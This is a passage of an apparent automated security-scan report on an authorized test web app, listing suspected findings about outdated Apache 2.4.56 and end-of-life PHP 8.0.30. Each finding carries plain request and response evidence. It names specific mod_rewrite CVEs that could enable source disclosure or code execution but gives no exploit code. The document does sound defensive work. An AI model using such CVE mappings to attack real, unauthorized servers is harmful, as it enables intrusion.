+<div class="ev"><div class="evh">Evidence <code>ev-mr2v2gbw-5</code> — <code>artifacts/s-0001/ev-mr2v2gbw-5/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:04:07 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is 65c41e846c851cdd2e361760a7060edd
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<h2 id="suspected">Suspected (needs manual verification)</h2>
+<p class="muted">Leads with one concrete anomaly but without control+2-replay confirmation — verify before relying on them.</p>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#b00020">CRITICAL</span> 5. [vulnerable-component] Outdated Apache httpd 2.4.56 — CVE-2024-38475 (mod_rewrite)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8081/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Apache/2.4.56 (Debian) detected via the Server response header on every page. It predates the entire 2.4.57→2.4.6x security train; most serious applicable issue is CVE-2024-38475 (mod_rewrite improper escaping of output, CVSS 9.1, affects &lt;=2.4.59) → unauthorized filesystem access / source disclosure / SSRF, an exploitable class. Also CVE-2024-40725 (CGI source disclosure). Version-based, not yet exploited — confirmation depends on the site's specific RewriteRule config.</div>
+<div class="desc">Server banner &quot;Apache/2.4.56 (Debian)&quot; (seen unauthenticated on / and /index.php). Apache 2.4.56 is missing all fixes from 2.4.57 onward. Primary lead: CVE-2024-38475 — improper escaping of output in mod_rewrite (fixed in 2.4.60, affects &lt;=2.4.59), critical (9.1); depending on RewriteRule substitutions it enables serving files from unintended locations → source code disclosure and, in some configurations, SSRF/code execution. Related July-2024 batch: CVE-2024-40725 (partial CGI source disclosure), CVE-2024-38474/38473 (mod_rewrite/mod_proxy encoding). DoS-class issues (CVE-2024-27316 HTTP/2 CONTINUATION flood) noted but excluded as non-exploitable-class. Version-based match — not actively confirmed; a real exploit requires the app's specific mod_rewrite configuration. Remediation: upgrade to the current 2.4.x.
+
+[+] Also observed as &quot;End-of-life PHP 8.0.30 — unsupported, unpatched (EOL 2023-11-26)&quot;.</div>
+<div><b>Reproduction</b></div><pre>GET http://target.local:8081/ and read the Server response header → &quot;Apache/2.4.56 (Debian)&quot;. Cross-reference against CVE-2024-38475 (fixed in Apache httpd 2.4.60). Active confirmation would require probing the deployed RewriteRules for the mod_rewrite output-escaping flaw; not performed (no generic non-destructive PoC without knowledge of the ruleset).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2y89a8-8s</code> — <code>artifacts/_/ev-mr2y89a8-8s/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 03:32:37 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is 38550f75507f83307d2e329454f242e1
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-6">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#d32f2f">HIGH</span> 6. [vulnerable-component] Apache 2.4.56 — multiple known High/Critical CVEs in later releases (CVE-2024-38474, CVE-2024-39573)</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8081/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> Apache 2.4.56 detected; CVE-2024-38474 (mod_rewrite substitution encoding, allows script execution — RCE-class, affects 2.4.0–2.4.61) and CVE-2024-39573 (mod_rewrite proxy handler injection, affects 2.4.0–2.4.61) were fixed in Apache 2.4.62 (July 2024). This installation predates the fix by over a year and is unpatched against these High/Critical issues if mod_rewrite is active.</div>
+<div class="desc">The server identifies as Apache/2.4.56 (Debian). Apache 2.4.62 (July 2024) patched CVE-2024-38474 (mod_rewrite substitution encoding bypass — allows executing scripts in directories permitted for scripts but not CGI; effectively RCE-class via mod_rewrite) and CVE-2024-39573 (mod_rewrite proxy handler substitution injection). Both affect all 2.4.x versions through 2.4.61. Apache 2.4.56 is within the affected range. Upgrade to 2.4.62+ is required.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:8081/ — Server header: Apache/2.4.56 (Debian)
+2. Confirmed by fingerprint_scan (ev-mr2v0po3-2)
+3. CVE-2024-38474 and CVE-2024-39573: fixed in Apache 2.4.62 (2024-07-17); 2.4.56 predates fix
+4. Verify by inspecting mod_rewrite configuration and testing for substitution-encoding bypass in relevant RewriteRule paths</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v0po3-2</code> — <code>artifacts/s-0001/ev-mr2v0po3-2/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:02:46 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is cd73f3b6e30de4b4e1d75cf3323b6b02
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-7">
+<h3><span class="badge" style="background:#8a6d00">SUSPECTED</span> <span class="badge" style="background:#d32f2f">HIGH</span> 7. [vulnerable-component] End-of-life PHP 8.0.30 — unsupported, unpatched (EOL 2023-11-26)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8081/</div>
+<div class="kv"><b>Anomaly (why this is a lead):</b> PHP/8.0.30 detected via the X-Powered-By response header. 8.0.30 is the final 8.0 release; the 8.0 branch reached end-of-life on 2023-11-26 and receives NO security patches. Any PHP-8.0-affecting vulnerability disclosed since then is permanently unpatched on this host. Note: the headline post-EOL critical CVE-2024-4577 (9.8 CGI arg-injection RCE) is Windows-CGI-specific and does NOT apply to this Debian/mod_php target; applicable Linux CVEs (CVE-2024-8927, CVE-2024-8925) are moderate. Version/EOL-based, not actively confirmed.</div>
+<div class="desc">X-Powered-By banner &quot;PHP/8.0.30&quot; (seen unauthenticated on /). PHP 8.0 reached end-of-life on 2023-11-26 — no further security releases. Operational risk is high: the interpreter is internet-reachable and will never receive fixes for future 8.0-affecting CVEs. Honest scoping of currently-known issues: CVE-2024-4577 (critical CGI-arg-injection RCE) is Windows-CGI-only and NOT applicable to a Debian mod_php deployment; the earlier phar-OOB RCE CVE-2023-3824 was already fixed in 8.0.30. Remaining post-EOL CVEs applicable to Linux (CVE-2024-8927 cookie-header $_GET bypass, CVE-2024-8925 multipart parsing) are moderate. This is a version/EOL-based lead, not an actively-confirmed exploit. Remediation: upgrade to a supported PHP branch (8.2+).</div>
+<div><b>Reproduction</b></div><pre>GET http://target.local:8081/ and read the X-Powered-By response header → &quot;PHP/8.0.30&quot;. Cross-reference release history: 8.0.30 (2023-08-03) is the last 8.0 release; branch EOL 2023-11-26. No safe active PoC applies (the notable critical CVE-2024-4577 requires the Windows CGI SAPI, absent here); classified suspected/version-based.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2y89a8-8s</code> — <code>artifacts/_/ev-mr2y89a8-8s/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 03:32:37 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is 38550f75507f83307d2e329454f242e1
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
